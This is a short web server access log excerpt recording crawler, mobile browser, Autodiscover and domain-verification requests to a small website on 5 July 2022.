66.249.64.173 - - [05/Jul/2022:18:10:04 +0000] "GET /cookies HTTP/1.1" 200 10087 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.194.95.196 - - [05/Jul/2022:18:10:31 +0000] "GET / HTTP/1.1" 200 10058 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
216.194.95.196 - - [05/Jul/2022:18:10:33 +0000] "GET /static/Index.css HTTP/1.1" 200 2710 "https://fsharely.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
216.194.95.196 - - [05/Jul/2022:18:10:33 +0000] "GET /static/Fonts.css HTTP/1.1" 200 476 "https://fsharely.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
216.194.95.196 - - [05/Jul/2022:18:10:37 +0000] "GET /pinUI HTTP/1.1" 200 3565 "https://fsharely.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
216.194.95.196 - - [05/Jul/2022:18:10:38 +0000] "GET /static/Pin.css HTTP/1.1" 200 1237 "https://fsharely.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
66.56.78.94 - - [05/Jul/2022:18:11:36 +0000] "GET / HTTP/1.1" 301 565 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
188.119.118.147 - - [05/Jul/2022:18:11:49 +0000] "GET / HTTP/1.1" 200 10058 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
152.39.184.250 - - [05/Jul/2022:18:12:02 +0000] "GET /static/Index.css HTTP/1.1" 200 7438 "https://fsharely.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
206.204.48.189 - - [05/Jul/2022:18:12:02 +0000] "GET /static/Fonts.css HTTP/1.1" 200 5204 "https://fsharely.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1"
185.7.214.104 - - [05/Jul/2022:18:45:11 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 592 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
18.209.211.206 - - [05/Jul/2022:18:49:24 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 301 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
